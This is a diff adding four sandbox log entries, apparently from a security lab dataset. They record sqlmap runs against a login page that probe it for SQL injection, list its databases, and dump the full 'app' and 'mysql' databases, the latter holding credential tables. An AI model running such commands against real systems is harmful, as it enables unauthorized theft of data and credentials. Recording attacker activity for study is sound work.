@@ -1,0 +1,4 @@
+{"sandbox_id": "117", "timestamp_str": "2021-01-14T11:16:24.774Z", "cmd_type": "bash-command", "cmd": "sqlmap -u \"server/login.php\" --forms"}
+{"sandbox_id": "117", "timestamp_str": "2021-01-14T11:16:53.807Z", "cmd_type": "bash-command", "cmd": "sqlmap -u \"server/login.php\" --forms --dbs"}
+{"sandbox_id": "117", "timestamp_str": "2021-01-14T11:17:23.805Z", "cmd_type": "bash-command", "cmd": "sqlmap -u \"server/login.php\" --forms -D app --dump-all"}
+{"sandbox_id": "117", "timestamp_str": "2021-01-14T11:20:24.915Z", "cmd_type": "bash-command", "cmd": "sqlmap -u \"server/login.php\" --forms -D mysql --dump-all"}
